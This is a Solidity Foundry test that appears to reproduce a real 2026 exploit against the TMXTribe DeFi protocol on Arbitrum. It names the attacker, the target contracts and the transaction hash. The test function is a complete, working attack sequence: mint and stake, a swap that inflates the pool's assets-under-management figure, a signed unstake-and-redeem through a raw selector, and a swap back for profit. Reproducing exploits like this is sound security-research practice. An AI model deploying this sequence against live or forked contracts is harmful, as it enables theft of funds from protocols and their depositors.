// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "src/shared/BaseTest.sol";
import "src/shared/interfaces.sol";

/*
@Protocol: TMXTribe
@Date: 2026-01-05
@Attacker: 0x763a67E4418278f84c04383071fC00165C112661
@Target: 0x6E7892aeCa5b77C23a17023F718Ff3524eE3Ba46
@TxHash: 0xc1d8582a754afdc00ba68d94772a31a266c0d0daff16276c5020d9a7b34ddbab
@ChainId: 42161
@GasUsed: 1048669
*/
address constant ATTACKER = 0x763a67E4418278f84c04383071fC00165C112661;
IERC20 constant USDT_TOKEN = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
IERC20 constant USDG = IERC20(0x9EC1f9f46636c293D03Aca25124749C231B1d598);
IERC20 constant TLP = IERC20(0xbd7e0b15AfE524F2a65492d0a0f3d60370494852);
IERC20 constant FTLP = IERC20(0x269402aB9D223C22827482A8Cc10975cecdD72AB);
IERC20 constant FSTLP = IERC20(0x3bB865266F6b48DF7241631530Cf1C1f18446Ec8);

address constant MINTANDSTAKE_PROXY = 0x6E7892aeCa5b77C23a17023F718Ff3524eE3Ba46;
address constant SWAP_PROXY = 0x18f340f493f37869FcdbB9565767B00F18B9E425;
address constant UNSTAKEANDREDEEM_PROXY = 0x6E7892aeCa5b77C23a17023F718Ff3524eE3Ba46;
address constant SECONDARY_SWAP_PROXY = 0x18f340f493f37869FcdbB9565767B00F18B9E425;
address constant glpManager = 0xE80fB6F907b37E2ed46a634882420B8E21BCCfB1;

contract TMXTribeTest is BaseTest {
    function setUp() public {
        vm.createSelectFork("arbitrum", 417991134);
        target = 0x6E7892aeCa5b77C23a17023F718Ff3524eE3Ba46;
        beneficiary = 0x763a67E4418278f84c04383071fC00165C112661;
        fundingToken = address(USDT_TOKEN);
    }

    function testExploit() public balanceLog {
        // TODO: Implement exploit
        // Set beneficiary if needed: beneficiary = address(0x123);
        // Profit will be automatically calculated and logged
        vm.startPrank(ATTACKER, ATTACKER);
        // Deposit USDT
        uint256 flashLoan_amount = 137_774_886_748; // 137,774.886748 USDT
        deal(address(USDT_TOKEN), ATTACKER, flashLoan_amount);

        // Approve Tokens

        USDT_TOKEN.approve(glpManager, type(uint256).max);
        USDT_TOKEN.approve(SWAP_PROXY, type(uint256).max);
        FSTLP.approve(UNSTAKEANDREDEEM_PROXY, type(uint256).max);
        USDG.approve(SECONDARY_SWAP_PROXY, type(uint256).max);

        // 1. Mint and Stake
        uint256 stakeAmount = 55_109_954_699;

        (bool s1, ) = MINTANDSTAKE_PROXY.call(
            abi.encodeWithSignature(
                "mintAndStakeGlp(address,uint256,uint256,uint256)",
                address(USDT_TOKEN),
                stakeAmount,
                0,
                0
            )
        );
        require(s1, "Mint and Stake failed");
        emit log_named_decimal_uint(
            "After Stake(FSTLP)",
            FSTLP.balanceOf(address(ATTACKER)),
            18
        );
        // Check Aums before Swap
        (bool s8, bytes memory aums) = glpManager.call(
            abi.encodeWithSignature("getAums()")
        );
        require(s8, "Get Aums failed");
        emit log_named_decimal_uint(
            "Before Swap Get Aums",
            abi.decode(aums, (uint256[]))[0],
            18
        );

        // 2. Swap
        address[] memory path1 = new address[](2);
        path1[0] = address(USDT_TOKEN);
        path1[1] = address(USDG);

        (bool s2, ) = SWAP_PROXY.call(
            abi.encodeWithSignature(
                "swap(address[],uint256,uint256,address)", // 공백 주의
                path1,
                82664932049, // amountIn
                0, // minOut
                ATTACKER // receiver
            )
        );
        require(s2, "Swap failed");

        emit log_named_decimal_uint(
            "After Swap",
            USDG.balanceOf(address(ATTACKER)),
            6
        );

        // Check Aums after Swap -> Aum is increased
        (bool s9, bytes memory aums2) = glpManager.call(
            abi.encodeWithSignature("getAums()")
        );
        require(s9, "Get Aums failed");
        emit log_named_decimal_uint(
            "After Swap Get Aums",
            abi.decode(aums2, (uint256[]))[0],
            18
        );

        // 3. Unstake and Redeem
        bytes memory unstakeAndRedeemData = abi.encodePacked(
            bytes4(0xf0d0711d), // Function selector
            abi.encode(address(USDT_TOKEN)), // varg1
            abi.encode(FSTLP.balanceOf(ATTACKER)), // varg2
            abi.encode(uint256(0)), // varg3
            abi.encode(ATTACKER), // receiver
            abi.encode(uint256(27)), // digital signature v
            abi.encode(
                0x3585e4992f55d0265e7bb415a14c6385bf3987e9a06ed29f83dcb3ffd5fad44f
            ), // digital signature r
            abi.encode(
                0x65233a3a17242afa9d840639256f10e44d0b69936683f8a3a1104e8129e2d6be
            ) // digital signature s
        );

        (bool s3, ) = UNSTAKEANDREDEEM_PROXY.call(unstakeAndRedeemData);
        require(s3, "Unstake with signature failed");
        emit log_named_decimal_uint(
            "After Unstake - USDT Balance",
            USDT_TOKEN.balanceOf(ATTACKER),
            6
        );

        //4. Secondary Swap
        uint256 currentUSDG = USDG.balanceOf(ATTACKER);

        if (currentUSDG > 0) {
            address[] memory path2 = new address[](2);
            path2[0] = address(USDG);
            path2[1] = address(USDT_TOKEN);
            (bool s4, ) = SECONDARY_SWAP_PROXY.call(
                abi.encodeWithSignature(
                    "swap(address[],uint256,uint256,address)",
                    path2,
                    currentUSDG,
                    0,
                    ATTACKER
                )
            );
            require(s4, "Secondary Swap failed");
        }
        emit log_named_decimal_uint(
            "After Secondary Swap",
            USDT_TOKEN.balanceOf(ATTACKER),
            6
        );
        vm.stopPrank();
    }
}
